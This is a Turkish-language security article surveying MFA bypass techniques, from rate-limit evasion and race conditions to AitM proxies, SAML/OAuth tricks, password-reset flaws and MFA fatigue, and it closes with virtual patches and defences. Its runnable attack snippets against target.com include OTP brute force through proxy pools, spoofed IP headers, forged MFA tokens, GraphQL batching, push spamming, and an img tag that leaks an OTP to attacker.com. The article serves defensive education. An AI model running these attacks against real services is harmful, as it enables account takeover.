<img width="1199" height="702" alt="Two" src="https://github.com/user-attachments/assets/82d5e6b4-f530-40ee-96a6-28dd0f055129" />

**MFA (Multi-Factor Authentication)**, çoğu güvenlik ekibi tarafından "son savunma hattı" olarak görülür — şifre çalınsa bile ikinci faktör olmadan giriş yapılamayacağı varsayılır. Bu varsayım kısmen doğrudur, ama tehlikeli bir körlük de yaratır: **MFA'nın kendisi de bir yazılımdır, ve her yazılım gibi mantık hataları barındırabilir.**

MFA bypass açıkları çoğunlukla **sözdizimsel değil, mantıksaldır**. Kod çalışır, OTP doğru üretilir, SMS/e-posta doğru gönderilir — ama akışın bir adımında "bu kullanıcı gerçekten ikinci faktörü tamamladı mı?" sorusu ya hiç sorulmaz ya da yanlış yerde sorulur. Bu yüzden SAST/DAST araçları bu tür açıkları neredeyse hiç yakalayamaz; mantık hatası, statik kod analizinin doğası gereği görünmezdir. Bulmak, **akışın tamamını uçtan uca takip etmeyi** gerektirir.

---

## 1. Mantıksal ve İşlevsel Zafiyetler (Business Logic Flaws)

### 1.1 OTP Brute-Force & Rate Limit Bypass

Standart bir OTP koruması genellikle "bir IP'den dakikada N deneme" veya "bir hesaba art arda 5 yanlış denemede kilitleme" mantığıyla çalışır. Sorun şu ki bu iki kontrol de **tek bir varsayıma** dayanır: saldırganın tek bir IP'den, tek bir hesaba saldıracağı varsayımı. Bu varsayım kolayca kırılabilir.

**IP Havuzu ile Rate Limit'i Anlamsızlaştırma:** Rate limiter IP bazlı çalışıyorsa, saldırgan isteklerini binlerce farklı IP'ye (proxy havuzu, bulut fonksiyonları, residential proxy) dağıtarak sayaç mantığını devre dışı bırakabilir.

```python
import random

proxies = load_proxy_pool()  # binlerce IP içeren havuz
for code in range(0000, 9999):
    proxy = random.choice(proxies)
    r = requests.post("https://target.com/api/verify-otp",
                       json={"otp": f"{code:04d}"}, proxies=proxy)
    if r.status_code == 200:
        print(f"Bulundu: {code}")
        break
```

**Header Manipülasyonu ile IP Aldatmaca:** Uygulama gerçek istemci IP'sini `X-Forwarded-For` gibi bir header'dan okuyorsa ve bu header doğrulanmıyorsa, saldırgan her istekte farklı (hatta whitelist'e girecek) bir değer basarak sistemi kandırabilir:

```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 10.0.0.1
True-Client-IP: 203.0.113.4
CF-Connecting-IP: 198.51.100.7
```

Rate limiter bu header'lardan birini "gerçek IP" olarak alıyorsa, her istekte farklı bir değer göndermek limiter'ın "yeni istemci" sanmasına yol açar.

**Parametre Varyasyonu (Padding/Smuggling):** Uygulama, "aynı isteği tekrar gönderiyor mu?" kontrolünü **birebir string eşleşmesiyle** yapıyorsa, parametreye görünmez bir fark eklemek bu kontrolü atlatır:

```
otp=1234
otp=1234%20
otp=1234%00
otp=["1234"]
otp=1234&otp=1234
```

Sunucu tarafındaki basit bir "aynı OTP tekrar denendi, reddet" filtresi, bu varyasyonları farklı istek sanabilir.

**Spray Attack (Yatay Kaba Kuvvet):** Tek hesaba 10.000 kod denemek yerine, 10.000 farklı hesaba en yaygın 3-4 kodu denemek — `0000`, `1234`, `1111` gibi — hem hesap kilitleme mekanizmalarını tetiklemez (her hesaba sadece 1-2 deneme düşer) hem de istatistiksel olarak en az bir hesapta başarılı olur.

```python
common_codes = ["0000", "1234", "1111", "9999"]
for user in target_user_list:
    for code in common_codes:
        r = requests.post("https://target.com/api/verify-otp",
                           json={"user": user, "otp": code})
        if r.status_code == 200:
            print(f"Başarılı: {user} -> {code}")
```

---

### 1.2 Response/Request Manipülasyonu

Bazı uygulamalar, MFA doğrulamasının sonucunu **istemciye** taşır ve istemcinin bu bilgiye "uyacağını" varsayar. Bu, güveni yanlış yere koymanın klasik örneğidir.

**Status Code Değişimi:** Sunucu `401 Unauthorized` dönerken, saldırgan Burp Suite ile bu yanıtı `200 OK`'a çevirir. Eğer frontend, sadece HTTP status koduna bakıp yönlendirme yapıyorsa (backend'de ayrıca bir session/token kontrolü yoksa), bu basit değişiklik MFA ekranını tamamen atlatabilir.

**JWT İçindeki MFA Bayrağının Değiştirilmesi:** Daha ciddi bir versiyonu, MFA durumunun bir JWT claim'i olarak taşınmasıdır:

```json
{
  "user_id": 1044,
  "mfa_verified": false
}
```

Eğer sunucu bu token'ın imzasını (signature) doğrulamıyorsa veya zayıf bir secret kullanıyorsa, saldırgan `mfa_verified` alanını `true` yapıp token'ı yeniden imzalayarak (bkz. API güvenliği yazısındaki JWT `alg:none` ve secret brute-force teknikleri) MFA adımını atlar.

**Öngörülebilir Geçici Token'lar:** Şifre doğru girildiğinde sunucu bir `X-MFA-Token` üretip tarayıcıya verir; kullanıcı OTP'yi girdiğinde bu token "tamamlandı" olarak işaretlenir. Eğer token, `MD5(user_id)` gibi zayıf ve tahmin edilebilir bir değerden üretiliyorsa, saldırgan OTP adımını hiç görmeden doğrudan bu token'ı hesaplayıp ana uygulamaya istek atabilir:

```python
import hashlib
token = hashlib.md5(str(target_user_id).encode()).hexdigest()
headers = {"X-MFA-Token": token}
r = requests.get("https://target.com/api/dashboard", headers=headers)
```

---

### 1.3 Session Fixation & Token Leakage

MFA aşamasında üretilen geçici oturum token'ı, güvenli olmayan bir kanaldan sızabilir:

* **URL'de taşınma:** `GET /mfa/verify?session=abc123` gibi bir URL, tarayıcı geçmişinde, proxy loglarında veya `Referer` header'ı üzerinden üçüncü taraf sitelere sızabilir.
* **Kaynak kodda görünme:** Token, sayfanın HTML'ine veya bir JavaScript değişkenine gömülüyorsa, sayfa kaynağını görüntüleyen herkes tarafından okunabilir.
* **Güvensiz cookie ayarları:** `HttpOnly` ve `Secure` bayrakları olmayan bir MFA session cookie'si, XSS veya düz metin (HTTP) trafiği üzerinden çalınabilir.

```
Set-Cookie: mfa_session=eyJhbGciOi...; Path=/
```

Burada `HttpOnly` ve `Secure` eksikliği, hem JavaScript üzerinden okunabilir hem de düz HTTP bağlantısında sızabilir olmasına yol açar.

---

### 1.4 Race Condition (Reentrancy)

**HTTP/2 Tek-Frame Saldırısı:** HTTP/2'nin çoklama (multiplexing) özelliği, birden fazla isteğin tek bir TCP bağlantısı üzerinden **aynı anda** gönderilmesine izin verir. Rate limit sayacı, isteklerin sırayla işlendiği varsayımıyla yazılmışsa, aynı milisaniyede gelen 100 istek sayaç güncellenmeden önce sunucuya ulaşabilir — bu da etkin olarak rate limit'in "atlanmasına" değil, **yarışılmasına** yol açar.

```python
import httpx
import asyncio

async def send_attempt(client, code):
    return await client.post("https://target.com/api/verify-otp", json={"otp": code})

async def race_attack():
    async with httpx.AsyncClient(http2=True) as client:
        tasks = [send_attempt(client, f"{i:04d}") for i in range(100)]
        results = await asyncio.gather(*tasks)
        for code, r in zip(range(100), results):
            if r.status_code == 200:
                print(f"Başarılı: {code:04d}")

asyncio.run(race_attack())
```

**OTP Yeniden Kullanımı (Reentrancy):** Doğru bir OTP kodu kullanıldığında, veritabanında "kullanıldı" olarak işaretlenmesi milisaniyeler sürer. Bu kısa pencere içinde aynı kodla eşzamanlı olarak birden fazla oturum açma isteği gönderilirse, "kullanıldı" kontrolü henüz devreye girmediği için **birden fazla oturum** başarıyla açılabilir. Bu, klasik bir TOCTOU (Time-of-Check to Time-of-Use) zafiyetidir.

---

## 2. Gelişmiş Kimlik Avı ve Otomasyon (AitM — Adversary-in-the-Middle)

Statik OTP kodlarının kendisini kırmak yerine, günümüz saldırılarının çoğu **MFA tamamlandıktan sonraki session'ı** hedefler — çünkü MFA bir kez geçildiğinde, oturum genellikle uzun süre "güvenilir" sayılır.

### 2.1 Reverse Proxy Tabanlı Session Hijacking

Evilginx3 ve Modlishka gibi araçların (burada exploit kodu değil, kavramsal çalışma mantığı anlatılmaktadır) temel fikri şudur: saldırgan, kurban ile gerçek site arasına **şeffaf bir ters proxy** yerleştirir. Kurban normal şekilde giriş yapar, şifresini ve OTP kodunu girer — proxy bu trafiği gerçek siteye iletir ve gerçek sitenin yanıtını kurbana geri gönderir. Kurban için her şey normal görünür.

Ancak bu süreçte proxy, gerçek sitenin **MFA sonrası verdiği session cookie'sini** de yakalar. Saldırgan artık şifreye veya OTP'ye ihtiyaç duymadan, çalınan bu cookie ile doğrudan oturumu devralabilir — çünkü MFA zaten tamamlanmış ve sunucu bu oturumu "doğrulanmış" olarak işaretlemiştir.

```
Cookie: session_token=eyJhbGciOiJIUzI1NiIs...
```

Bu cookie çalındığı andan itibaren, saldırgan kurbanın hiçbir ek doğrulamaya gerek kalmadan hesabına erişebilir — MFA burada **login anını** korur, ama **sonrasındaki oturumu** korumaz.

### 2.2 Fingerprint ve Bot Koruma Farkındalığı

Modern AitM araçları tespit edilmemek için tarayıcı parmak izini (TLS handshake sırasında oluşan JA3/JA4 fingerprint) taklit etmeye çalışır ve CAPTCHA/bot koruma sistemlerini tetiklememek için residential proxy ağları kullanır. Savunma tarafında bu, şu anlama gelir: **sadece kullanıcı adı/şifre/OTP doğruluğuna bakmak yeterli değildir** — TLS fingerprint tutarsızlığı, olağandışı proxy/datacenter IP kullanımı gibi sinyaller de değerlendirilmelidir.

### 2.3 Conditional Access / Kurumsal Persistence

Microsoft Entra ID (Azure AD) gibi kurumsal kimlik sağlayıcıları, çalınan bir session cookie'sinin **farklı bir IP veya ülkeden** kullanıldığını tespit edip ek doğrulama isteyebilir (Conditional Access). Ancak bu koruma da mutlak değildir: saldırgan, kurbanın gerçek IP'sine coğrafi olarak yakın bir VPN/proxy node'u kullanarak veya çalınan cookie'yi doğrudan kurbanın cihazına bulaşmış bir bilgi hırsızı (infostealer) yazılım üzerinden, kurbanın kendi tarayıcısı içinden kullanarak bu tutarlılık kontrolünü atlatabilir.

**Savunma açısından önemli nokta:** IP/coğrafya tutarlılığı tek başına yeterli bir sinyal değildir; cihaz binding (device fingerprint + sertifika tabanlı cihaz kimliği) ile birleştirilmesi gerekir.

---

## 3. Protokol ve API Seviyesinde Güvenlik

### 3.1 OAuth / SAML / OIDC Manipülasyonları

**SAML Assertion Injection:** Kurumsal SSO ortamlarında, MFA'nın tamamlanıp tamamlanmadığı bilgisi genellikle SAML yanıtındaki `<saml:AuthnContextClassRef>` alanında taşınır:

```xml
<saml:AuthnStatement>
  <saml:AuthnContext>
    <saml:AuthnContextClassRef>
      urn:oasis:names:tc:SAML:2.0:ac:classes:MultiFactor
    </saml:AuthnContextClassRef>
  </saml:AuthnContext>
</saml:AuthnStatement>
```

Eğer servis sağlayıcı (Service Provider), gelen SAML yanıtının **XML imzasını** düzgün doğrulamıyorsa — örneğin sadece belge içeriğine bakıp imzanın var olup olmadığını kontrol edip, imzanın gerçekten bu içerikle eşleştiğini doğrulamıyorsa — saldırgan bu alanı `PasswordProtectedTransport` (tek faktörlü) olarak değiştirip MFA yapılmamış bir girişi "MFA tamamlanmış" gibi gösterebilir.

**OAuth Scope Downgrade / Cross-Application Login:** Aynı OAuth altyapısını paylaşan birden fazla uygulama olduğunda, bunlardan biri (örneğin eski bir yardım masası portalı) MFA istemiyor olabilir. Saldırgan, yetkilendirme isteğindeki `client_id` ve `scope` parametrelerini bu zayıf uygulamaya işaret edecek şekilde değiştirir:

```
GET /oauth/authorize?
  client_id=legacy-helpdesk-app&
  scope=profile+email&
  response_type=code&
  redirect_uri=https://legacy.target.com/callback
```

Zayıf uygulamadan alınan token, çoğu zaman aynı kullanıcı kimliğini temsil ettiği için ana uygulamada da kabul edilebilir — böylece MFA'nın olduğu uygulama, MFA'sı olmayan "kardeş" uygulama üzerinden dolaylı olarak atlatılmış olur.

### 3.2 API Versiyon Düşürme (Version Downgrade)

Güncel API uç noktası sıkı kontrol altındayken, eski ve kapatılması unutulmuş bir versiyon aynı işlevi daha zayıf korumayla sunabilir:

```
POST /api/v3/login/mfa    → rate limit var, sıkı kontrol
POST /api/v1/login        → MFA kontrolü hiç yok veya eksik
```

Mobil uygulamaların eski sürümleri hâlâ `/api/v1/` uç noktasını kullanıyor olabilir; bu uç nokta güvenlik ekibinin gözünden kaçmış, hâlâ aktif ve MFA'sız erişime izin veriyor olabilir.

### 3.3 GraphQL Batching ile Rate-Limit Atlatma

Sistem GraphQL kullanıyorsa, tek bir HTTP isteği içinde alias'lar aracılığıyla **yüzlerce OTP doğrulama sorgusu** birleştirilebilir:

```graphql
query {
  a1: verifyOTP(code: "0001") { success }
  a2: verifyOTP(code: "0002") { success }
  a3: verifyOTP(code: "0003") { success }
  # ... yüzlerce alias
}
```

Rate limiter HTTP istek sayısına göre çalışıyorsa, bu tek istek görünürde limiti hiç tetiklemez — çünkü sunucu tarafında "istek" tek, ama resolver çağrısı yüzlercedir.

---

## 4. Kriptografik ve Algoritmik Zayıflıklar

### 4.1 Zayıf PRNG ile OTP Tahmini

OTP kodu, kriptografik olarak güvenli olmayan bir rastgele sayı üretici (`Math.random()`, eski PHP `rand()`) ile üretiliyorsa, üretilen ilk birkaç kod gözlemlendikten sonra üreticinin iç durumu (internal state) matematiksel olarak yeniden inşa edilip **sonraki kodlar tahmin edilebilir** hale gelir. Bu, kriptanaliz literatüründe iyi bilinen bir saldırı sınıfıdır (örneğin Mersenne Twister'ın iç durumunun az sayıda çıktıdan geri hesaplanabilmesi).

```javascript
// ❌ Riskli: kriptografik olmayan PRNG ile OTP üretimi
const otp = Math.floor(1000 + Math.random() * 9000);
```

```javascript
// ✅ Güvenli: kriptografik olarak güvenli rastgelelik
const crypto = require('crypto');
const otp = crypto.randomInt(1000, 9999);
```

### 4.2 TOTP/HOTP Zaman Penceresi İstismarı (Clock Drift)

Standart TOTP kodları 30 saniye geçerlidir, ama sunucular ağ gecikmesini tolere etmek için genellikle geçmiş 1-2 ve gelecek 1 dönemi de kabul eder — bu da fiilen 2-3 dakikalık bir kabul penceresi anlamına gelir. Bu tolerans çok geniş tutulduğunda:

* Ele geçirilmiş eski bir kod (örneğin bir log dosyasından veya omuz sörfü ile görülmüş bir kod), süresi teknik olarak dolmuş olsa bile hâlâ kabul edilebilir.
* Zaman kaydırma saldırılarında (saldırganın sunucu saatini bir şekilde etkileyebildiği senaryolarda), bu tolerans daha da genişletilebilir.

**Savunma:** Kabul penceresi mümkün olan en dar aralıkta (±1 periyot, yani toplam 90 saniye) tutulmalı ve her kod **tek kullanımlık** olarak işaretlenip aynı pencere içinde ikinci kez kullanımı reddedilmelidir.

### 4.3 Zayıf Seed/Secret Üretimi

MFA kurulumunda (Google Authenticator'a taratılan QR kodun arkasındaki) gizli anahtar (seed), rastgele değil de kullanıcının kullanıcı adı, kayıt tarihi gibi tahmin edilebilir bir değerin hash'lenmesiyle üretiliyorsa:

```python
# ❌ Riskli: seed tahmin edilebilir girdilerden türetiliyor
seed = hashlib.sha1(f"{username}{registration_date}".encode()).hexdigest()
```

Saldırgan, kurbanın kullanıcı adını ve yaklaşık kayıt tarihini biliyorsa (çoğu zaman herkese açık bilgidir), aynı algoritmayı kendi tarafında çalıştırıp **kurbanın seed'ini yeniden üretebilir** — bu andan itibaren kurbanın tüm gelecekteki TOTP kodlarını, hiçbir cihaza erişmeden üretebilir.

---

## 5. İletişim Kanalları Üzerinden Atlatma (SMS/E-posta)

### 5.1 SMS Gateway Parametre Manipülasyonu

Şirketlerin SMS göndermek için kullandığı üçüncü parti entegrasyonlar (Twilio ve benzerleri) bazen hatalı yapılandırılır. İstek parametrelerine birincil telefon numarasının yanına **ikinci bir alıcı** eklenebiliyorsa:

```json
POST /api/send-otp
{
  "phone": "victim_phone",
  "alternative_phone": "attacker_phone"
}
```

veya dizi tabanlı bir enjeksiyon kabul ediliyorsa:

```json
{ "phone": ["victim_phone", "attacker_phone"] }
```

Backend bu ek alanı/elemanı filtrelemeden SMS gateway'ine iletiyorsa, OTP kodu **hem kurbana hem saldırgana** gider.

### 5.2 E-posta HTML/CSS Enjeksiyonu ile OTP Sızdırma

Sistem OTP kodunu e-posta ile gönderiyorsa ve kayıt formundaki bir alan (örneğin "görünen ad") HTML olarak e-posta şablonuna işleniyorsa:

```html
Kullanıcı adı: <img src="http://attacker.com/collect?leak=" onerror="...">
```

Eğer OTP kodu, bu kullanıcı tarafından kontrol edilen alanla **aynı şablon işleme adımında** render ediliyorsa (örneğin sunucu tarafı template engine'de doğru escape yapılmadıysa), OTP değeri istemeden aynı HTML parçasına sızabilir ve saldırganın sunucusuna otomatik olarak (resim yükleme isteği üzerinden) iletilebilir. Bu senaryo nadir ama gerçek — kök neden, kullanıcı girdisinin e-posta şablonunda düzgün encode edilmemesidir (klasik bir XSS/template injection türevi).

---

## 6. Şifre Sıfırlama Akışında MFA Bypass

Bu, pratikte en sık karşılaşılan ve en kritik MFA bypass kategorisidir çünkü geliştiriciler neredeyse her zaman **ana giriş ekranına** MFA ekler ama **şifre sıfırlama akışını unutur.**

### 6.1 Şifre Değiştirince MFA'nın Sıfırlanması (Default-State Zafiyeti)

Bazı sistemlerde, şifre sıfırlama işlemi başarıyla tamamlandığında backend, kullanıcının hesabındaki güvenlik ayarlarını "varsayılan duruma" döndürme mantığıyla tasarlanmıştır — ve bu döndürme yanlışlıkla MFA ayarlarını da kapsayabilir.

```python
# ❌ Riskli: şifre sıfırlanınca ilgisiz güvenlik alanları da sıfırlanıyor
def reset_password(user, new_password):
    user.password_hash = hash_password(new_password)
    user.mfa_enabled = False  # kasıtsız yan etki
    user.save()
```

Saldırgan, kurbanın hesabına şifre sıfırlama linkini tetikleyip (veya e-posta hesabına bir şekilde erişip) şifreyi değiştirdiği an, kurbanın MFA koruması da kendiliğinden devre dışı kalır.

### 6.2 Reset Token'ı ile MFA Ekranını Atlatma

Bazı akışlarda şifre sıfırlama linkine tıklandığında önce yeni şifre belirlenir, **sonra** MFA kodu istenir. Ancak yeni şifre bu noktada veritabanına çoktan yazılmıştır. Eğer sistem "şifre yeni değiştirildiği için MFA adımını bu oturumda geçici olarak askıya al" gibi bir mantıkla yazılmışsa, saldırgan MFA ekranını kapatıp doğrudan ana giriş sayfasından yeni şifreyle giriş yapmayı dener — ve bu geçici "askıya alma" mantığı yüzünden içeri girer.

### 6.3 Yedek Kurtarma Kodlarının (Backup Codes) Öngörülebilirliği

MFA cihazı kaybedildiğinde kullanılmak üzere verilen 8 haneli yedek kodların üretim algoritması zayıfsa (örneğin sıralı, kullanıcı ID'sinden türetilmiş veya küçük bir karakter uzayından seçilmişse), saldırgan ana OTP yerine bu **daha az korunan** statik kodları hedef alır — genellikle backup code doğrulama endpoint'i, ana OTP endpoint'i kadar sıkı rate-limit'e sahip değildir.

```python
for code in range(10000000, 99999999):
    r = requests.post("https://target.com/api/verify-backup-code",
                       json={"code": str(code)})
    if r.status_code == 200:
        print(f"Bulundu: {code}")
        break
```

---

## 7. MFA Fatigue (Push Notification Spamming)

Push tabanlı MFA (Duo, Okta Verify, Microsoft Authenticator gibi "onayla/reddet" bildirimleri), OTP girmek zorunda kalmadığı için kullanıcı deneyimi açısından tercih edilir — ama bu kolaylık yeni bir saldırı yüzeyi açar.

**Mekanizma:** Saldırgan, kurbanın çalınmış kullanıcı adı/şifresiyle art arda, kısa aralıklarla giriş denemeleri tetikler. Her deneme, kurbanın telefonuna bir onay bildirimi düşürür. Amaç, kurbanı gece yarısı veya art arda gelen onlarca bildirimle **bıktırıp**, "artık dursun" diyerek yanlışlıkla veya bilinçsizce "Onayla"ya basmasını sağlamaktır. Bu teknik, 2022'de büyük bir teknoloji şirketinde yaşanan gerçek bir sızıntı vakasında da (isim vermeden, mekanizma düzeyinde) kullanılmıştır: saldırgan defalarca giriş denemiş, ardından kurbanla "IT destek" kimliğine bürünerek iletişime geçip bildirimi onaylamasını istemiştir (sosyal mühendislik ile birleştirilmiş MFA fatigue).

```python
# Kavramsal örnek: art arda giriş denemesi tetikleyerek push bildirimi yağdırma
for _ in range(50):
    requests.post("https://target.com/api/login",
                   json={"username": "victim", "password": stolen_password})
    time.sleep(5)
```

**Savunma — Number Matching:** Modern push MFA sistemleri, kullanıcının sadece "Onayla" tuşuna basmasını değil, giriş ekranında gösterilen **2 haneli bir sayıyı** telefonundaki uygulamaya girmesini zorunlu kılar. Bu, kullanıcının bildirimi bilinçsizce onaylamasını büyük ölçüde engeller çünkü giriş ekranını görmeden doğru sayıyı girmesi mümkün değildir.

**Ek savunmalar:** Push bildirimine coğrafi konum ve cihaz bilgisi eklenmesi ("Bu giriş İstanbul'dan, Chrome/Windows üzerinden yapıldı" gibi), kısa sürede art arda gelen push isteklerinin otomatik olarak rate-limit'lenmesi ve/veya hesabın geçici olarak kilitlenmesi.

---

## Virtual Patch

Gerçek dünyada kalıcı çözüm (merkezi MFA state yönetimi, backend-only doğrulama, kriptografik olarak güvenli OTP üretimi) hazır olana kadar, ilgili akışa **mimariyi değiştirmeden** uygulanabilecek hızlı yamalar gerekir.

**1. OTP/MFA Endpoint'ine Gateway Seviyesinde Sert Rate Limit**

```python
@limiter.limit("5 per minute", key_func=lambda: request.json.get("user_id"))
@app.route('/api/verify-otp', methods=['POST'])
def verify_otp(): ...
```

Kullanıcı ID'sine bağlı, IP'den bağımsız bir limit — IP havuzu ile atlatmayı zorlaştırır.

**2. MFA Durumunu Asla İstemciye Taşımama (Acil Backend-Only Kontrol)**

```python
# ✅ Acil patch: MFA durumu sadece server-side session'da tutulur, response'a hiç konmaz
session["mfa_verified"] = True  # sunucu tarafı, istemciye asla dönmez
if not session.get("mfa_verified"):
    return abort(403)
```

**3. Şifre Sıfırlama Akışına Geçici "MFA'yı Asla Otomatik Kapatma" Kilidi**

```python
def reset_password(user, new_password):
    user.password_hash = hash_password(new_password)
    # ✅ acil patch: MFA alanına kesinlikle dokunulmuyor
    user.save()
```

**4. SMS/E-posta Gönderim API'sine Tek Alıcı Zorunluluğu**

```python
ALLOWED_KEYS = {"phone"}
payload = {k: v for k, v in request.json.items() if k in ALLOWED_KEYS}
if not isinstance(payload.get("phone"), str):
    return abort(400)  # dizi veya ikinci alıcı anında reddedilir
```

**5. Push Sağlayıcıda Number Matching'i Anında Aktif Etme**

Çoğu kurumsal MFA sağlayıcısında (Duo, Okta, Microsoft Authenticator) number matching bir konfigürasyon anahtarıdır, kod değişikliği gerektirmez — admin panelinden aynı gün aktif edilebilir ve MFA fatigue riskini büyük ölçüde azaltır.

**Dikkat edilmesi gerekenler:**

* Bu yamalar geçicidir; asıl çözüm MFA state'inin merkezi, sadece backend tarafından yönetilen ve her istekte yeniden doğrulanan bir mekanizmaya taşınmasıdır.
* Rate limit patch'i, eski/unutulmuş API versiyonlarına (bkz. bölüm 3.2) da uygulanmalı — tek bir endpoint yamalanıp diğerleri unutulursa açık kapanmamış olur.
* Geçici çözüm sonrası kalıcı fix backlog'a değil aynı sprint'e yazılmalı.

---

## Savunma — Tüm Kategoriler İçin Kalıcı Çözümler

**Bölüm 1 — Mantıksal Zafiyetler:** Rate limit kullanıcı hesabına bağlanmalı, IP'ye değil; MFA durumu sadece backend session'ında tutulmalı, hiçbir claim/response alanında istemciye taşınmamalı; OTP doğrulama ve "kullanıldı" işaretleme işlemleri atomik (tek transaction) olmalı ki race condition'a açık kalmasın.

**Bölüm 2 — AitM:** MFA sonrası session'lar için cihaz binding (device fingerprint + sertifika tabanlı kimlik) uygulanmalı; kritik işlemlerde (şifre değiştirme, yeni cihaz ekleme) session yaşı ne olursa olsun MFA'nın **yeniden** istenmesi (step-up authentication) sağlanmalı.

**Bölüm 3 — Protokol/API:** SAML yanıtlarının XML imzası her zaman kriptografik olarak doğrulanmalı; OAuth `client_id`/`scope` kombinasyonları backend'de whitelist ile sınırlanmalı; eski API versiyonları aktif olarak kapatılmalı; GraphQL rate limiting sorgu/alias sayısına göre hesaplanmalı.

**Bölüm 4 — Kriptografi:** OTP/seed üretiminde her zaman kriptografik olarak güvenli rastgelelik (`crypto.randomInt`, `secrets.token_hex`) kullanılmalı; TOTP kabul penceresi dar tutulmalı (±1 periyot) ve her kod tek kullanımlık işaretlenmeli; seed asla kullanıcıya ait tahmin edilebilir verilerden türetilmemeli.

**Bölüm 5 — İletişim Kanalları:** SMS/e-posta gönderim API'leri tek, doğrulanmış alıcıyla sınırlanmalı; kullanıcı tarafından girilen hiçbir alan (görünen ad vb.) e-posta şablonunda ham HTML olarak render edilmemeli, her zaman encode edilmeli.

**Bölüm 6 — Şifre Sıfırlama:** Şifre sıfırlama ve MFA ayarları birbirinden tamamen bağımsız yönetilmeli; şifre değişimi hiçbir koşulda MFA'yı otomatik devre dışı bırakmamalı; backup code'lar OTP kadar sıkı rate-limit ve karmaşıklığa sahip olmalı.

**Bölüm 7 — MFA Fatigue:** Number matching zorunlu tutulmalı; push bildirimlerine coğrafi konum/cihaz bilgisi eklenmeli; kısa sürede art arda gelen push istekleri otomatik olarak sınırlanmalı veya hesap geçici kilitlenmeli.

---

## Yaygın Senaryolar

* Header manipülasyonu ile rate limit atlatma
  `X-Forwarded-For: 127.0.0.1` (her istekte farklı değer)

* JWT üzerinden MFA bayrağı manipülasyonu
  `{"mfa_verified": false}` → `{"mfa_verified": true}`

* Şifre sıfırlama ile MFA'nın kasıtsız sıfırlanması
  `reset_password() → user.mfa_enabled = False` (yan etki)

* GraphQL batching ile OTP toplu deneme
  `query { a1: verifyOTP(code:"0001") a2: verifyOTP(code:"0002") ... }`

* Zayıf PRNG ile OTP tahmini
  `Math.random()` tabanlı OTP üretimi → sonraki kodun hesaplanması

* MFA Fatigue ile sosyal mühendislik
  Art arda push bildirimi + "IT destek" kimliğine bürünme

---
